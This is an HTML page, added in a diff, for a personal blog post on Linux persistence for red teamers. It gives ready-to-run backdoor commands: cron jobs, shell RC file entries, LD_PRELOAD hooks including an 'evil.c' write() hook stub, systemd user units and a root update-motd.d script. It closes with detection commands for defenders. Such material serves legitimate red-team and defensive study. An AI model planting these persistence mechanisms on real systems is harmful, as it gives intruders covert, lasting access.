@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, notranslate"/>
+<meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex, notranslate"/>
+<meta name="bingbot" content="noindex, nofollow, noarchive, nosnippet, noimageindex, notranslate"/>
+<meta http-equiv="X-Robots-Tag" content="noindex, nofollow, noarchive, nosnippet, noimageindex, notranslate"/>
+<title>Linux persistence for red teamers - Samridh Gaur</title>
+<script src="https://cdn.tailwindcss.com?plugins=forms,typography"></script>
+<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet"/>
+<script>
+  tailwind.config = {
+    darkMode: "class",
+    theme: {
+      extend: {
+        colors: {
+          primary: "#019863",
+          "background-light": "#f5f8f7",
+          "background-dark": "#0f231c",
+          "text-light": "#111111",
+          "text-dark": "#e5e7eb",
+          "text-secondary-light": "#6b7280",
+          "text-secondary-dark": "#9ca3af",
+          "border-light": "#e5e7eb",
+          "border-dark": "#2d2d2d"
+        },
+        fontFamily: { sans: ["Inter", "sans-serif"], display: "Manrope" },
+        borderRadius: { DEFAULT: "1rem", lg: "2rem", xl: "3rem", full: "9999px" }
+      }
+    }
+  };
+</script>
+<style>
+  body { font-family: 'Arial Black', sans-serif; letter-spacing: -1px; }
+  h1, h2, h3 { font-family: 'Arial Black', sans-serif; letter-spacing: -2px; }
+  .brutalist-border { border: 3px solid currentColor; }
+  .brutalist-link { text-decoration: none; color: currentColor; padding: 4px 0; position: relative; }
+  .brutalist-link::after { content: ''; position: absolute; width: 100%; transform: scaleX(0); height: 3px; bottom: -3px; left: 0; background-color: currentColor; transform-origin: bottom right; transition: transform 0.3s ease-out; }
+  .brutalist-link:hover::after { transform: scaleX(1); transform-origin: bottom left; }
+  .brutalist-button { border: 3px solid currentColor; padding: 8px 16px; background-color: transparent; color: currentColor; transition: all 0.2s ease-in-out; }
+  .brutalist-button:hover { background-color: currentColor; color: var(--background-light); }
+  .dark .brutalist-button:hover { background-color: currentColor; color: var(--background-dark); }
+  .post-meta { font-family: monospace; }
+  .tag { font-family: monospace; font-size: 0.75rem; border: 2px solid currentColor; padding: 2px 8px; text-transform: uppercase; letter-spacing: 0.1em; }
+  .prose { font-family: 'Arial', sans-serif; font-size: 1.05rem; line-height: 1.75; letter-spacing: -0.2px; font-weight: 400; }
+  .prose p { margin-bottom: 1.4rem; }
+  .prose h2 { font-family: 'Arial Black', sans-serif; font-size: 1.6rem; font-weight: 900; letter-spacing: -2px; margin-top: 2.8rem; margin-bottom: 1rem; text-transform: uppercase; }
+  .prose h3 { font-family: 'Arial Black', sans-serif; font-size: 1.2rem; font-weight: 900; letter-spacing: -1.5px; margin-top: 2rem; margin-bottom: 0.75rem; text-transform: uppercase; }
+  .prose ul { margin-bottom: 1.4rem; padding-left: 1.5rem; list-style: disc; }
+  .prose ol { margin-bottom: 1.4rem; padding-left: 1.5rem; list-style: decimal; }
+  .prose li { margin-bottom: 0.4rem; }
+  .prose code { font-family: 'Courier New', Courier, monospace; background: rgba(0,0,0,0.07); padding: 2px 6px; font-size: 0.88em; border-radius: 2px; }
+  .dark .prose code { background: rgba(255,255,255,0.1); }
+  .prose pre { font-family: 'Courier New', Courier, monospace; background: #111; color: #e5e7eb; padding: 1.25rem 1.5rem; margin-bottom: 1.75rem; border: 3px solid currentColor; font-size: 0.875rem; line-height: 1.65; overflow-x: auto; }
+  .dark .prose pre { background: #0a0a0a; }
+  .prose pre code { background: none; padding: 0; font-size: inherit; }
+  .prose strong { font-weight: 900; font-family: 'Arial Black', sans-serif; letter-spacing: -0.5px; }
+</style>
+</head>
+<body class="bg-white dark:bg-black text-black dark:text-white font-sans transition-colors duration-0">
+<div class="max-w-3xl mx-auto px-4 sm:px-6 lg:px-8 py-10">
+
+  <header class="flex flex-col items-center gap-6 sm:flex-row sm:justify-between sm:items-center mb-16 sm:mb-20">
+    <a class="text-xl font-bold brutalist-link" href="../index.html">samridh.com<span class="text-primary">~</span></a>
+    <div class="flex flex-wrap items-center justify-center gap-4 sm:justify-end sm:gap-8">
+      <a class="text-xl brutalist-link" href="../index.html">home</a>
+      <a class="text-xl brutalist-link" href="../blog.html">blog</a>
+      <a class="text-xl brutalist-link" href="#">resume</a>
+      <button id="theme-toggle" class="text-black dark:text-white brutalist-button text-2xl p-2">
+        <span class="material-icons text-xl">wb_sunny</span>
+      </button>
+    </div>
+  </header>
+
+  <main>
+    <article>
+      <div class="mb-10">
+        <p class="post-meta text-sm mb-4">FEBRUARY 10, 2025 &nbsp;&nbsp; <span class="tag">RED TEAM</span></p>
+        <h1 class="text-4xl sm:text-5xl uppercase font-bold leading-none mb-6">LIVING IN /TMP: PERSISTENCE TRICKS EVERY RED TEAMER KNOWS</h1>
+      </div>
+
+      <div class="prose text-black dark:text-white">
+        <p>
+          You've got a shell on a Linux box. Initial access is done. Now the real question: how do you make sure you still have access after a reboot, a session timeout, or a user logout?
+        </p>
+        <p>
+          This post covers the practical persistence techniques that show up in real red team engagements. They range from "trivially detectable if anyone looks" to "survives most automated detection." They're documented here for the same reason we document lock-picking: defenders need to know what they're up against.
+        </p>
+
+        <h2>1. Crontab</h2>
+        <p>The oldest trick in the book. Still works.</p>
+        <pre><code># User-level crontab — no root required
+(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.update 2>/dev/null") | crontab -
+
+# System-level — needs root
+echo "*/5 * * * * root /tmp/.update 2>/dev/null" > /etc/cron.d/system-update</code></pre>
+        <p>
+          User crontabs live in <code>/var/spool/cron/crontabs/USERNAME</code>. The entries in <code>/etc/cron.d/</code> require a username field between the schedule and the command — that's a difference that catches people.
+        </p>
+        <p>
+          Most EDR and SIEM tools alert on new cron entries. If you're on an engagement and cron trips an alert within minutes, consider that the blue team has a detection there and move on to less-monitored mechanisms.
+        </p>
+
+        <h2>2. Shell RC files</h2>
+        <pre><code># Runs every time user opens an interactive bash shell
+echo 'nohup /tmp/.agent -q &>/dev/null &' >> ~/.bashrc
+
+# Runs on login shells
+echo '/tmp/.agent &>/dev/null &' >> ~/.profile
+
+# .bash_profile overrides .profile on login shells if it exists
+echo '/tmp/.agent &>/dev/null &' >> ~/.bash_profile</code></pre>
+        <p>
+          Easy to plant, easy to spot. The value here is persistence against session timeouts — every time the user opens a terminal, your agent fires. On servers without interactive logins this doesn't help much.
+        </p>
+
+        <h2>3. LD_PRELOAD hijacking</h2>
+        <p>
+          <code>LD_PRELOAD</code> tells the dynamic linker to load your library before everything else. Your library's functions shadow glibc's. Classic use case: override <code>open()</code>, <code>write()</code>, <code>execve()</code> to log or intercept calls.
+        </p>
+        <pre><code># System-wide (root required) — every dynamically-linked process loads your SO
+echo '/tmp/.libsys.so' > /etc/ld.so.preload
+
+# User-level via .bashrc (no root needed)
+echo 'export LD_PRELOAD=/home/user/.cache/.lib.so' >> ~/.bashrc</code></pre>
+        <p>
+          A system-wide <code>ld.so.preload</code> entry is powerful but very noisy from a forensics perspective — check the file and you see it immediately. The user-level variant only affects processes started from that user's shell session.
+        </p>
+        <p>
+          Building the malicious SO is straightforward:
+        </p>
+        <pre><code>// evil.c — hooks write() to also exfiltrate to attacker
+#define _GNU_SOURCE
+#include &lt;dlfcn.h&gt;
+#include &lt;unistd.h&gt;
+
+ssize_t write(int fd, const void *buf, size_t count) {
+    ssize_t (*orig_write)(int, const void*, size_t) = dlsym(RTLD_NEXT, "write");
+    // exfil logic here
+    return orig_write(fd, buf, count);
+}</code></pre>
+        <pre><code>gcc -shared -fPIC -o evil.so evil.c -ldl</code></pre>
+
+        <h2>4. Systemd user units</h2>
+        <p>
+          This one gets overlooked because people don't think to look in user-space systemd. No root required. Survives reboot as long as lingering is enabled (which it often is on servers).
+        </p>
+        <pre><code>mkdir -p ~/.config/systemd/user/
+
+cat > ~/.config/systemd/user/updater.service &lt;&lt;EOF
+[Unit]
+Description=User Update Agent
+
+[Service]
+ExecStart=/tmp/.agent
+Restart=always
+RestartSec=30
+
+[Install]
+WantedBy=default.target
+EOF
+
+systemctl --user daemon-reload
+systemctl --user enable updater
+systemctl --user start updater</code></pre>
+        <p>
+          Check if lingering is enabled for the user (allows services to run without an active login session):
+        </p>
+        <pre><code>loginctl show-user $USER | grep Linger
+# Linger=yes means it survives logout</code></pre>
+        <pre><code># Enable lingering (as root)
+loginctl enable-linger USERNAME</code></pre>
+
+        <h2>5. update-motd.d</h2>
+        <p>
+          On Debian/Ubuntu systems, <code>/etc/update-motd.d/</code> contains scripts that run as root every time someone logs in via SSH. This is how the dynamic MOTD works. It's a free root shell execution on every SSH login.
+        </p>
+        <pre><code>cat > /etc/update-motd.d/99-agent &lt;&lt;'EOF'
+#!/bin/bash
+/tmp/.agent &>/dev/null &
+EOF
+chmod +x /etc/update-motd.d/99-agent</code></pre>
+        <p>Runs as root, triggered by SSH login, rarely audited. Check your MOTD scripts.</p>
+
+        <h2>Detecting all of this</h2>
+        <pre><code># 1. All user crontabs
+for user in $(cut -f1 -d: /etc/passwd); do
+    crontab -u "$user" -l 2>/dev/null | grep -v '^#' | sed "s/^/$user: /"
+done
+
+# 2. System cron directories
+ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.hourly/
+
+# 3. ld.so.preload
+cat /etc/ld.so.preload 2>/dev/null
+
+# 4. Systemd user units across all users
+find /home -path "*/.config/systemd/user/*.service" 2>/dev/null
+find /root -path "*/.config/systemd/user/*.service" 2>/dev/null
+
+# 5. Shell RC file backdoors
+grep -r 'nohup\|LD_PRELOAD\|/tmp\|/dev/shm' /home/*/.bashrc /home/*/.profile \
+    /root/.bashrc /root/.profile 2>/dev/null
+
+# 6. MOTD scripts
+ls -la /etc/update-motd.d/
+cat /etc/update-motd.d/*</code></pre>
+
+        <h2>A note on /dev/shm</h2>
+        <p>
+          <code>/tmp</code> is obvious. <code>/dev/shm</code> is a RAM-backed tmpfs that's world-writable on most systems. Files there are wiped on reboot but survive process restarts. Malware operators use it because some log aggregators and scanners exclude it. Don't exclude it — scan it like you'd scan <code>/tmp</code>.
+        </p>
+      </div>
+    </article>
+
+    <div class="mt-16 pt-8" style="border-top: 3px solid currentColor;">
+      <a class="text-xl brutalist-link" href="../blog.html">← Back to Blog</a>
+    </div>
+  </main>
+
+  <footer class="mt-24 sm:mt-32 text-sm text-black dark:text-white flex flex-col items-center gap-3 text-center sm:text-left sm:flex-row sm:justify-between sm:items-center brutalist-border p-4">
+    <span class="uppercase">@sxmridhx0</span>
+    <span class="uppercase"><span class="material-icons text-base align-middle">lens</span> v1.0.0</span>
+  </footer>
+</div>
+
+<script>
+  const themeToggle = document.getElementById('theme-toggle');
+  const sunIcon = themeToggle.querySelector('span');
+  themeToggle.addEventListener('click', () => {
+    document.documentElement.classList.toggle('dark');
+    if (document.documentElement.classList.contains('dark')) {
+      sunIcon.textContent = 'dark_mode';
+      themeToggle.style.color = 'black';
+      themeToggle.style.backgroundColor = 'white';
+      themeToggle.style.borderColor = 'black';
+      themeToggle.querySelector('span').style.color = 'black';
+    } else {
+      sunIcon.textContent = 'wb_sunny';
+      themeToggle.style.color = 'white';
+      themeToggle.style.backgroundColor = 'black';
+      themeToggle.style.borderColor = 'white';
+      themeToggle.querySelector('span').style.color = 'white';
+    }
+  });
+  if (document.documentElement.classList.contains('dark')) {
+    sunIcon.textContent = 'dark_mode';
+    themeToggle.style.color = 'black';
+    themeToggle.style.backgroundColor = 'white';
+    themeToggle.style.borderColor = 'black';
+    themeToggle.querySelector('span').style.color = 'black';
+  } else {
+    sunIcon.textContent = 'wb_sunny';
+    themeToggle.style.color = 'white';
+    themeToggle.style.backgroundColor = 'black';
+    themeToggle.style.borderColor = 'white';
+    themeToggle.querySelector('span').style.color = 'white';
+  }
+</script>
+</body>
+</html>
